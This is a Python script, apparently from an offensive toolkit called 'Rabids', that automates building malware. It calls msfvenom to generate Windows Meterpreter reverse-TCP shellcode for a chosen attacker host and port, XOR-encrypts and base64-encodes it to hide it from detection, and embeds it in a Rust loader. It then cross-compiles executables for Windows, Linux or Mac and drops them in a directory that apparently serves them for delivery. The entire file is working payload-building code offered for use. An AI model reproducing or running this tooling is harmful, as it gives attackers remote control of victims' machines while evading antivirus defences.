import subprocess
import base64
import os
import argparse
import shutil
import platform as py_platform
import difflib
import sys

SCRIPT_ROOT = os.path.dirname(os.path.abspath(__file__))

def get_target_triple(platform_name):
    if platform_name == "windows":
        return "x86_64-pc-windows-gnu"
    elif platform_name == "linux":
        return "x86_64-unknown-linux-gnu"
    elif platform_name == "mac":
        return "x86_64-apple-darwin"
    else:
        raise ValueError("Unsupported platform")

def generate_encrypted_shellcode(lhost, lport, key):
    """Generate XOR-encrypted and base64-encoded shellcode using msfvenom."""
    cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw"
    result = subprocess.run(cmd, shell=True, check=True, capture_output=True)
    shellcode = result.stdout
    
    encrypted = bytes([b ^ key for b in shellcode])
    
    encrypted_b64 = base64.b64encode(encrypted).decode('utf-8')
    
    return encrypted_b64

def embed_shellcode_in_rust(rust_path, encrypted_b64, key):
    """Embed the base64-encoded shellcode and key into the Rust source file."""
    rust_path = os.path.abspath(rust_path)
    with open(rust_path, "r") as f:
        lines = f.readlines()
    
    for i, line in enumerate(lines):
        if "const ENCRYPTED_SHELLCODE: &str = " in line:
            lines[i] = f'const ENCRYPTED_SHELLCODE: &str = "{encrypted_b64}";\n'
        if "const KEY: u8 = " in line:
            lines[i] = f"const KEY: u8 = 0x{key:02X};\n"
    
    with open(rust_path, "w") as f:
        f.writelines(lines)

def build_rust_project(project_dir, platform_name):
    """Compile the Rust project using cargo for the specified platform and return the executable path."""
    project_dir = os.path.abspath(project_dir)
    target_triple = get_target_triple(platform_name)
    cmd = f"cargo build --release --target {target_triple}"
    subprocess.run(cmd, shell=True, check=True, cwd=project_dir)
    
    cargo_toml = os.path.join(project_dir, "Cargo.toml")
    package_name = None
    with open(cargo_toml, "r") as f:
        for line in f:
            if line.strip().startswith("name ="):
                package_name = line.split("=")[1].strip().strip('"')
                break
    if not package_name:
        package_name = "spidermurphy"
    ext = ".exe" if platform_name == "windows" else ""
    exe_path = os.path.join(project_dir, "target", target_triple, "release", f"{package_name}{ext}")
    return exe_path

def print_rabids_guide():
    print("\033[1;35mRabids Payload Builder Options:\033[0m")
    print("  -lhost     (The IP address to connect to)")
    print("  -lport     (The port to connect to)")
    print("  -key       (The XOR key to use)")
    print("  -output    (The output file name)")
    print("  -platform  (Target platform: windows, linux, mac)")
    print("  -h         (Help)")
    print("\033[93mTip:\033[0m You can use single dash for all options.\n")

def suggest_rabids_option(user_opt, valid_opts):
    matches = difflib.get_close_matches(user_opt, valid_opts, n=3, cutoff=0.5)
    if matches:
        print("\033[93mDid you mean:\033[0m")
        for m in matches:
            print(f"  \033[1;32m{m}\033[0m")
    else:
        print("\033[93mNo similar options found.\033[0m")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Automate payload embedding and compilation", add_help=False)
    parser.add_argument("-lhost", type=str, required="-lhost" in sys.argv, help="The IP address to connect to")
    parser.add_argument("-lport", type=int, required="-lport" in sys.argv, help="The port to connect to")
    parser.add_argument("-key", type=int, required="-key" in sys.argv, help="The XOR key to use")
    parser.add_argument("-output", type=str, required="-output" in sys.argv, help="The output file name (will be placed in DAEMONS/filedaemon/dir/)")
    parser.add_argument("-platform", type=str, choices=["windows", "linux", "mac"], default=py_platform.system().lower() if py_platform.system().lower() in ["windows", "linux", "mac"] else "linux", help="Target platform to compile for (windows, linux, mac)")
    parser.add_argument("-h", "--help", action="store_true", help="Show help message and exit")
    known_opts = ['-lhost', '-lport', '-key', '-output', '-platform', '-h']
    if len(sys.argv) == 1:
        print_rabids_guide()
        sys.exit(0)
    for arg in sys.argv[1:]:
        if arg.startswith('-') and arg not in known_opts and not arg.startswith('--'):
            print(f"\033[1;31m✗ Error:\033[0m \033[93mUnknown option '{arg}'.\033[0m\n")
            suggest_rabids_option(arg, known_opts)
            print()
            print_rabids_guide()
            sys.exit(2)
    args = parser.parse_args()
    if args.help:
        print_rabids_guide()
        sys.exit(0)
    
    lhost = args.lhost
    lport = args.lport
    key = args.key
    output = args.output
    platform_name = args.platform
    
    base_dir = SCRIPT_ROOT
    project_dir = os.path.join(base_dir, "source", "spidermurphy")
    rust_file = os.path.join(project_dir, "src", "main.rs")
    output_dir = os.path.join(base_dir, "..", "filedaemon", "dir")
    output_dir = os.path.abspath(output_dir)
    os.makedirs(output_dir, exist_ok=True)
    final_output_path = os.path.join(output_dir, output)
    
    encrypted_b64 = generate_encrypted_shellcode(lhost, lport, key)
    
    embed_shellcode_in_rust(rust_file, encrypted_b64, key)
    
    exe_path = build_rust_project(project_dir, platform_name)
    
    shutil.move(exe_path, final_output_path)
    
    print(f"Executable built and saved at: {final_output_path}")